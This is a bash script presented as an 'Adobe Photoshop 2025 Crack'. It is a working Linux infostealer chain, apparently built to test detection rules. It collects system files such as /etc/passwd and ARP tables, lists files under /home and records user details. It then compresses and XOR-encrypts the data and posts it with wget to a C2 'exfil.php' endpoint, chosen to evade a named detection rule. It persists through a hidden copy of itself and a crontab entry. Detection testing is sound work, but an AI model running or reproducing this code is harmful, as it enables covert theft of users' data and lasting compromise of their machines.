#!/bin/bash
# ============================================================
# Adobe Photoshop 2025 Crack - Linux Evasion (network discovery)
# Phase 1: thêm /proc/net/tcp, /proc/net/arp, /proc/net/dev, socket.gethostname
# ============================================================

RUN_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 8 | head -n 1)
C2_SERVER="http://192.168.10.105"
STAGING_DIR="/dev/shm/.adobe_crack_$RUN_ID"
mkdir -p "$STAGING_DIR"

GREEN='\033[0;32m'
CYAN='\033[0;36m'
GRAY='\033[0;90m'
NC='\033[0m'

run_py() {
    local marker="$1"
    local code="$2"
    python3 -c "$code" "$marker"
}

run_bash() {
    local marker="$1"
    local cmd="$2"
    bash -c "$cmd" "$marker"
}

# ============================================================
# PHASE 1: System info + Network Discovery (via /proc)
# ============================================================
phase1() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 1] System Info + Network Discovery (evasion)${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    run_bash "MARKER_PHASE1_${RUN_ID}" "cat /proc/version /etc/os-release /etc/passwd /etc/hosts /proc/net/arp > '$STAGING_DIR/sys.txt' 2>/dev/null"
    echo -e "${GREEN}  [+] Phase 1 done${NC}"
    sleep 2
}

# ============================================================
# PHASE 2: File discovery (os.walk /home)
# ============================================================
phase2() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 2] File Discovery (evasion)${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    run_py "MARKER_PHASE2_${RUN_ID}" '
import os
files = []
for root, dirs, filenames in os.walk("/home"):
    for f in filenames:
        files.append(os.path.join(root, f))
with open("'$STAGING_DIR'/files.txt","w") as f:
    f.write("\n".join(files[:100]))
'
    echo -e "${GREEN}  [+] Phase 2 done${NC}"
    sleep 2
}

# ============================================================
# PHASE 3: User info (ghi file)
# ============================================================
phase3() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 3] User Info (evasion)${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    run_py "MARKER_PHASE3_${RUN_ID}" '
import os, datetime
user = os.getlogin()
home = os.environ.get("HOME","")
cwd = os.getcwd()
now = datetime.datetime.now().isoformat()
with open("'$STAGING_DIR'/user.txt","w") as f:
    f.write(f"{user}|{home}|{cwd}|{now}")
'
    echo -e "${GREEN}  [+] Phase 3 done${NC}"
    sleep 2
}

# ============================================================
# PHASE 4: Data Compression (tar)
# ============================================================
phase4() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 4] Data Compression (evasion)${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    run_bash "MARKER_PHASE4_${RUN_ID}" "tar -czf '$STAGING_DIR/data.tar.gz' -C '$STAGING_DIR' . 2>/dev/null"
    echo -e "${GREEN}  [+] Data compressed${NC}"
    sleep 2
}

# ============================================================
# PHASE 5: Exfiltration (wget --post-file thay curl, marker là argv[1])
# ============================================================
phase5() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 5] Exfiltration (evasion)${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    if [[ ! -f "$STAGING_DIR/data.tar.gz" ]]; then
        echo "dummy" > "$STAGING_DIR/dummy.txt"
        tar -czf "$STAGING_DIR/data.tar.gz" -C "$STAGING_DIR" dummy.txt 2>/dev/null
    fi

    # Build encrypted JSON payload khớp exfil.php (XOR key=0x42)
    local PAYLOAD_FILE="$STAGING_DIR/.payload.json"
    python3 -c "
import json, base64, socket, os
hostname = socket.gethostname()
username = os.environ.get('USER', os.environ.get('LOGNAME', 'unknown'))
with open('$STAGING_DIR/data.tar.gz', 'rb') as f:
    content_b64 = base64.b64encode(f.read()).decode()
inner = json.dumps({'victim_id': hostname, 'username': username, 'run_id': '$RUN_ID', 'phase_id': '$PHASE_ID', 'data_type': 'full_archive', 'content': content_b64})
encrypted = bytes([b ^ 0x42 for b in inner.encode()])
print(json.dumps({'data': base64.b64encode(encrypted).decode()}))
" 2>/dev/null > "$PAYLOAD_FILE"

    # Evasion: wget thay curl (tránh RED-Linux 05), marker là argv[1] của bash -c
    run_bash "MARKER_PHASE5_${RUN_ID}" \
        "wget -q --post-file='$PAYLOAD_FILE' --header='Content-Type: application/json' '${C2_SERVER}/exfil.php' -O /dev/null 2>/dev/null"

    echo -e "${GREEN}  [+] Data exfiltrated${NC}"
    sleep 2
}

# ============================================================
# PHASE 6: Persistence via crontab
# ============================================================
phase6() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 6] Persistence (evasion)${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    if [ "$EUID" -eq 0 ]; then
        REAL_HOME="/root"
    else
        REAL_HOME="$HOME"
    fi
    local PERSIST_PATH="$REAL_HOME/.adobe_update.sh"
    cp "$0" "$PERSIST_PATH" 2>/dev/null || cp "$(readlink -f $0)" "$PERSIST_PATH" 2>/dev/null
    chmod +x "$PERSIST_PATH"
    local CRON_JOB="0 0 * * * $PERSIST_PATH --run-id $RUN_ID > /dev/null 2>&1"
    run_bash "MARKER_PHASE6_${RUN_ID}" "(crontab -l 2>/dev/null | grep -v 'adobe_update'; echo '$CRON_JOB') | crontab -"
    echo -e "${GREEN}  [+] Persistence installed (script at $PERSIST_PATH)${NC}"
    sleep 2
}

# ============================================================
# CLEANUP
# ============================================================
cleanup() {
    echo -e "\n${GRAY}Cleaning temporary files...${NC}"
    rm -rf "$STAGING_DIR" 2>/dev/null
}

# ============================================================
# MAIN
# ============================================================
echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   Adobe Photoshop 2025 Crack - Linux EVASION (network)      ║${NC}"
echo -e "${GREEN}║   Run ID: $RUN_ID${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"

phase1
phase2
phase3
phase4
phase5
phase6
cleanup

echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   LINUX EVASION CHAIN COMPLETED                          ║${NC}"
echo -e "${GREEN}║  Run ID: $RUN_ID${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"
